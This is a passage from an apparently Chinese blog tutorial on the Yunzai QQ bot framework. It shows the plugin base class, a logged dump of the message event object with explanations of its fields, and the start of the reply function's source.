<span class="doctag">@param</span> priority 优先级，数字越小优先级越高</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">rule</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.reg 命令正则</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.fnc 命令执行方法</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.event 执行事件，默认message</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.log  false时不显示执行日志</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> rule.permission 权限 master,owner,admin,all</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> <span class="variable">task</span></span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.name 定时任务名称</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.cron 定时任务cron表达式</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.fnc 定时任务方法名</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> task.log  false时不显示执行日志</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">    name = <span class="string">&quot;your-plugin&quot;</span>,</span></span><br><span class="line"><span class="params">    dsc = <span class="string">&quot;无&quot;</span>,</span></span><br><span class="line"><span class="params">    handler,</span></span><br><span class="line"><span class="params">    namespace,</span></span><br><span class="line"><span class="params">    event = <span class="string">&quot;message&quot;</span>,</span></span><br><span class="line"><span class="params">    priority = <span class="number">5000</span>,</span></span><br><span class="line"><span class="params">    task = &#123; name: <span class="string">&quot;&quot;</span>, fnc: <span class="string">&quot;&quot;</span>, cron: <span class="string">&quot;&quot;</span> &#125;,</span></span><br><span class="line"><span class="params">    rule = []</span></span><br><span class="line"><span class="params">  &#125;</span>)</span><br><span class="line">  ........</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> msg 发送的消息</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> quote 是否引用回复</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data.recallMsg 群聊是否撤回消息，0-120秒，0不撤回</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> data.at 是否at用户</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="title function_">reply</span>(<span class="params">msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">e</span>?.<span class="property">reply</span> || !msg) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">e</span>.<span class="title function_">reply</span>(msg, quote, data)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>然后会调用自定义实现的func函数，在setcontext之后，后续收到的消息会将程序执行流转到另一个自定义的函数doRep。最终bot实际发送消息是用<code>this.reply</code>这个接口实现的，在父类中看，调用了e对象中的reply。</p>
<h5 id="e对象结构"><a href="#e对象结构" class="headerlink" title="e对象结构"></a>e对象结构</h5><p>我们要想稍微深入一点理解执行过程，就首先得知道<code>this.e</code>是个什么对象。我们可以加一个console.log来在日志中记录这个e的具体结构。加上之后给bot发<code>#复读</code>看看结构。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125230821783.png"
                      class=""
                >

<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line">&lt;ref *<span class="number">1</span>&gt; <span class="punctuation">&#123;</span></span><br><span class="line">  message_type<span class="punctuation">:</span> &#x27;group&#x27;<span class="punctuation">,</span></span><br><span class="line">  sub_type<span class="punctuation">:</span> &#x27;normal&#x27;<span class="punctuation">,</span></span><br><span class="line">  message_id<span class="punctuation">:</span> <span class="number">32652067</span><span class="punctuation">,</span></span><br><span class="line">  group_id<span class="punctuation">:</span> <span class="number">1003519385</span><span class="punctuation">,</span></span><br><span class="line">  user_id<span class="punctuation">:</span> <span class="number">2583727188</span><span class="punctuation">,</span></span><br><span class="line">  anonymous<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  message<span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">&#123;</span> text<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span> type<span class="punctuation">:</span> &#x27;text&#x27; <span class="punctuation">&#125;</span> <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  raw_message<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  font<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">  sender<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    user_id<span class="punctuation">:</span> <span class="number">2583727188</span><span class="punctuation">,</span></span><br><span class="line">    nickname<span class="punctuation">:</span> &#x27;collectcrop&#x27;<span class="punctuation">,</span></span><br><span class="line">    card<span class="punctuation">:</span> &#x27;collectcrop&#x27;<span class="punctuation">,</span></span><br><span class="line">    sex<span class="punctuation">:</span> &#x27;unknown&#x27;<span class="punctuation">,</span></span><br><span class="line">    age<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    area<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">    level<span class="punctuation">:</span> &#x27;<span class="number">2</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">    role<span class="punctuation">:</span> &#x27;owner&#x27;<span class="punctuation">,</span></span><br><span class="line">    title<span class="punctuation">:</span> &#x27;&#x27;</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  time<span class="punctuation">:</span> <span class="number">1732547237</span><span class="punctuation">,</span></span><br><span class="line">  self_id<span class="punctuation">:</span> <span class="number">3832600704</span><span class="punctuation">,</span></span><br><span class="line">  post_type<span class="punctuation">:</span> &#x27;message&#x27;<span class="punctuation">,</span></span><br><span class="line">  raw<span class="punctuation">:</span> &#x27;<span class="punctuation">&#123;</span><span class="attr">&quot;message_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;group&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sub_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;normal&quot;</span><span class="punctuation">,</span><span class="attr">&quot;message_id&quot;</span><span class="punctuation">:</span><span class="number">32652067</span><span class="punctuation">,</span><span class="attr">&quot;group_id&quot;</span><span class="punctuation">:</span><span class="number">1003519385</span><span class="punctuation">,</span><span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span><span class="number">2583727188</span><span class="punctuation">,</span><span class="attr">&quot;anonymous&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;text&quot;</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;text&quot;</span><span class="punctuation">:</span><span class="string">&quot;#\\u590D\\u8BFB&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;raw_message&quot;</span><span class="punctuation">:</span><span class="string">&quot;#\\u590D\\u8BFB&quot;</span><span class="punctuation">,</span><span class="attr">&quot;font&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;sender&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span><span class="number">2583727188</span><span class="punctuation">,</span><span class="attr">&quot;nickname&quot;</span><span class="punctuation">:</span><span class="string">&quot;collectcrop&quot;</span><span class="punctuation">,</span><span class="attr">&quot;card&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;sex&quot;</span><span class="punctuation">:</span><span class="string">&quot;unknown&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;area&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;level&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;owner&quot;</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;time&quot;</span><span class="punctuation">:</span><span class="number">1732547237</span><span class="punctuation">,</span><span class="attr">&quot;self_id&quot;</span><span class="punctuation">:</span><span class="number">3832600704</span><span class="punctuation">,</span><span class="attr">&quot;post_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;message&quot;</span><span class="punctuation">&#125;</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">  bot<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    adapter<span class="punctuation">:</span> OneBotv11Adapter <span class="punctuation">&#123;</span></span><br><span class="line">      id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">      name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      path<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      echo<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      timeout<span class="punctuation">:</span> <span class="number">60000</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    ws<span class="punctuation">:</span> WebSocket <span class="punctuation">&#123;</span></span><br><span class="line">      _events<span class="punctuation">:</span> <span class="punctuation">[</span>Object<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span> prototype<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _eventsCount<span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">      _maxListeners<span class="punctuation">:</span> undefined<span class="punctuation">,</span></span><br><span class="line">      _binaryType<span class="punctuation">:</span> &#x27;nodebuffer&#x27;<span class="punctuation">,</span></span><br><span class="line">      _closeCode<span class="punctuation">:</span> <span class="number">1006</span><span class="punctuation">,</span></span><br><span class="line">      _closeFrameReceived<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _closeFrameSent<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _closeMessage<span class="punctuation">:</span> &lt;Buffer &gt;<span class="punctuation">,</span></span><br><span class="line">      _closeTimer<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      _errorEmitted<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _extensions<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      _paused<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      _protocol<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">      _readyState<span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      _receiver<span class="punctuation">:</span> <span class="punctuation">[</span>Receiver<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _sender<span class="punctuation">:</span> <span class="punctuation">[</span>Sender<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _socket<span class="punctuation">:</span> <span class="punctuation">[</span>Socket<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      _autoPong<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      _isServer<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      rid<span class="punctuation">:</span> &#x27;<span class="punctuation">:</span><span class="punctuation">:</span>ffff<span class="punctuation">:</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="punctuation">:</span><span class="number">52599</span>-dldWBbcOj0mF9sQR9Mpc6g==&#x27;<span class="punctuation">,</span></span><br><span class="line">      sid<span class="punctuation">:</span> &#x27;ws<span class="punctuation">:</span><span class="comment">//127.0.0.1:2536/OneBotv11&#x27;,</span></span><br><span class="line">      sendMsg<span class="punctuation">:</span> <span class="punctuation">[</span>Function (anonymous)<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span>Symbol(shapeMode)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">[</span>Symbol(kCapture)<span class="punctuation">]</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    sendApi<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> sendApi<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    stat<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      start_time<span class="punctuation">:</span> <span class="number">1732545494</span><span class="punctuation">,</span></span><br><span class="line">      stat<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      lost_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      lost_times<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      recv_msg_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      recv_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      sent_msg_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      sent_pkt_cnt<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      app_initialized<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      app_enabled<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      app_good<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      online<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      good<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    model<span class="punctuation">:</span> &#x27;TRSS Yunzai &#x27;<span class="punctuation">,</span></span><br><span class="line">    info<span class="punctuation">:</span> <span class="punctuation">&#123;</span> user_id<span class="punctuation">:</span> <span class="number">3832600704</span><span class="punctuation">,</span> nickname<span class="punctuation">:</span> &#x27;testbot&#x27; <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    uin<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    nickname<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    avatar<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setProfile<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setProfile<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setNickname<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setNickname<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setAvatar<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setAvatar<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickFriend<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickFriend<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickUser<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendArray<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendArray<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendList<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendList<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getFriendMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getFriendMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    fl<span class="punctuation">:</span> Map(<span class="number">3</span>) <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="number">66600000</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="number">2583727188</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="number">3832600704</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    pickMember<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickMember<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    pickGroup<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> pickGroup<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupArray<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupArray<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupList<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupList<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getGroupMemberMap<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getGroupMemberMap<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    gl<span class="punctuation">:</span> Map(<span class="number">1</span>) <span class="punctuation">&#123;</span> <span class="number">1003519385</span> =&gt; <span class="punctuation">[</span>Object<span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    gml<span class="punctuation">:</span> Map(<span class="number">1</span>) <span class="punctuation">&#123;</span> <span class="number">1003519385</span> =&gt; <span class="punctuation">[</span>Map<span class="punctuation">]</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    request_list<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getSystemMsg<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getSystemMsg<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setFriendAddRequest<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setFriendAddRequest<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    setGroupAddRequest<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> setGroupAddRequest<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    cookies<span class="punctuation">:</span> <span class="punctuation">&#123;</span> &#x27;aq.qq.com&#x27;<span class="punctuation">:</span> undefined <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    getCookies<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getCookies<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    getCsrfToken<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> getCsrfToken<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    guild_info<span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    clients<span class="punctuation">:</span> undefined<span class="punctuation">,</span></span><br><span class="line">    version<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      app_name<span class="punctuation">:</span> &#x27;Lagrange.OneBot&#x27;<span class="punctuation">,</span></span><br><span class="line">      app_version<span class="punctuation">:</span> &#x27;<span class="number">0.0</span><span class="number">.3</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">      protocol_version<span class="punctuation">:</span> &#x27;v11&#x27;<span class="punctuation">,</span></span><br><span class="line">      nt_protocol<span class="punctuation">:</span> &#x27;Linux | <span class="number">3.2</span><span class="number">.10</span><span class="number">-25765</span>&#x27;<span class="punctuation">,</span></span><br><span class="line">      id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">      name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">      version<span class="punctuation">:</span> <span class="punctuation">[</span>Getter<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    bkn<span class="punctuation">:</span> <span class="number">202881165</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  group_name<span class="punctuation">:</span> &#x27;testbot、collec...&#x27;<span class="punctuation">,</span></span><br><span class="line">  adapter_id<span class="punctuation">:</span> &#x27;QQ&#x27;<span class="punctuation">,</span></span><br><span class="line">  adapter_name<span class="punctuation">:</span> &#x27;OneBotv11&#x27;<span class="punctuation">,</span></span><br><span class="line">  reply<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction (anonymous)<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  msg<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  logText<span class="punctuation">:</span> &#x27;\x1B<span class="punctuation">[</span><span class="number">36</span>m<span class="punctuation">[</span>testbot、collec...(<span class="number">1003519385</span>)<span class="punctuation">,</span> collectcrop(<span class="number">2583727188</span>)<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m\x1B<span class="punctuation">[</span><span class="number">31</span>m<span class="punctuation">[</span>#复读<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m&#x27;<span class="punctuation">,</span></span><br><span class="line">  isGroup<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  recall<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> bound recallMsg<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  isMaster<span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  runtime<span class="punctuation">:</span> Runtime <span class="punctuation">&#123;</span></span><br><span class="line">    e<span class="punctuation">:</span> <span class="punctuation">[</span>Circular *<span class="number">1</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    _mysInfo<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    handler<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      has<span class="punctuation">:</span> <span class="punctuation">[</span>Function<span class="punctuation">:</span> has<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      call<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction<span class="punctuation">:</span> call<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      callAll<span class="punctuation">:</span> <span class="punctuation">[</span>AsyncFunction<span class="punctuation">:</span> callAll<span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  original_msg<span class="punctuation">:</span> &#x27;#复读&#x27;<span class="punctuation">,</span></span><br><span class="line">  logFnc<span class="punctuation">:</span> &#x27;\x1B<span class="punctuation">[</span><span class="number">34</span>m<span class="punctuation">[</span>复读(repeat)<span class="punctuation">]</span>\x1B<span class="punctuation">[</span><span class="number">39</span>m&#x27;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<h6 id="核心信息"><a href="#核心信息" class="headerlink" title="核心信息"></a><strong>核心信息</strong></h6><ul>
<li><strong><code>message_type</code></strong>: 表示消息类型。<ul>
<li><code>&quot;group&quot;</code>: 群聊消息。</li>
<li><code>&quot;private&quot;</code>: 私聊消息。</li>
</ul>
</li>
<li><strong><code>sub_type</code></strong>: 子类型。<ul>
<li>对于群聊消息，常见值是 <code>&quot;normal&quot;</code>，表示普通消息。</li>
</ul>
</li>
<li><strong><code>message_id</code></strong>: 消息 ID，可用于引用或撤回这条消息。</li>
<li><strong><code>group_id</code></strong>: 群号，仅当消息类型是 <code>&quot;group&quot;</code> 时存在。</li>
<li><strong><code>user_id</code></strong>: 发送者的 QQ 号。</li>
<li><strong><code>message</code></strong>: 消息的具体内容，数组形式，每个元素是一个对象，表示消息的组成部分。<ul>
<li><strong>示例</strong>: <code>[ &#123; text: &#39;#复读&#39;, type: &#39;text&#39; &#125; ]</code></li>
</ul>
</li>
<li><strong><code>raw_message</code></strong>: 消息的原始内容，字符串形式。<ul>
<li><strong>示例</strong>: <code>&quot;#复读&quot;</code></li>
</ul>
</li>
<li><strong><code>sender</code></strong>: 发送者信息，包含以下字段：<ul>
<li><code>user_id</code>: 发送者 QQ 号。</li>
<li><code>nickname</code>: 昵称。</li>
<li><code>card</code>: 群名片。</li>
<li><code>sex</code>: 性别，值可能是 <code>&quot;male&quot;</code>、<code>&quot;female&quot;</code> 或 <code>&quot;unknown&quot;</code>。</li>
<li><code>level</code>: 群等级。</li>
<li><code>role</code>: 群内角色，可能是 <code>&quot;owner&quot;</code>（群主）、<code>&quot;admin&quot;</code>（管理员）或 <code>&quot;member&quot;</code>（普通成员）。</li>
</ul>
</li>
</ul>
<hr>
<h6 id="扩展信息"><a href="#扩展信息" class="headerlink" title="扩展信息"></a><strong>扩展信息</strong></h6><ul>
<li><strong><code>self_id</code></strong>: 机器人的 QQ 号。</li>
<li><strong><code>post_type</code></strong>: 事件类型。<ul>
<li><code>&quot;message&quot;</code>: 消息事件。</li>
</ul>
</li>
<li><strong><code>time</code></strong>: 发送时间的时间戳（Unix 时间）。</li>
<li><strong><code>isGroup</code></strong>: 布尔值，表示消息是否来自群聊。</li>
<li><strong><code>isMaster</code></strong>: 布尔值，表示发送者是否为插件配置的主人。</li>
</ul>
<hr>
<h6 id="事件上下文管理"><a href="#事件上下文管理" class="headerlink" title="事件上下文管理"></a><strong>事件上下文管理</strong></h6><ul>
<li><code>runtime</code>: 插件运行时信息。<ul>
<li><code>runtime.e</code>: 当前事件对象（即 <code>this.e</code> 本身）。</li>
<li>其他属性用于管理事件处理流程。</li>
</ul>
</li>
</ul>
<h5 id="reply函数实现"><a href="#reply函数实现" class="headerlink" title="reply函数实现"></a>reply函数实现</h5><p>同样的方式，用<code>console.log(this.e.reply.toString());</code>，能动态查看这个reply函数的源码。然后再在vscode里搜索一下，最后在loader.js中找到了对应代码。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">e.<span class="property">reply</span> = <span class="title function_">async</span> (msg = <span class="string">&quot;&quot;</span>, quote = <span class="literal">false</span>, data = &#123;&#125;) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!msg) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> &#123; recallMsg = <span class="number">0</span>, at = <span class="string">&quot;&quot;</span> &#125; = data</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (at &amp;&amp; e.<span class="property">isGroup</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (at === <span class="literal">true</span>)</span><br><span class="line">          at = e.<span class="property">user_id</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(msg))</span><br><span class="line">          msg.<span class="title function_">unshift</span>(segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          msg = [segment.<span class="title function_">at</span>(at), <span class="string">&quot;\n&quot;</span>, msg]</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span 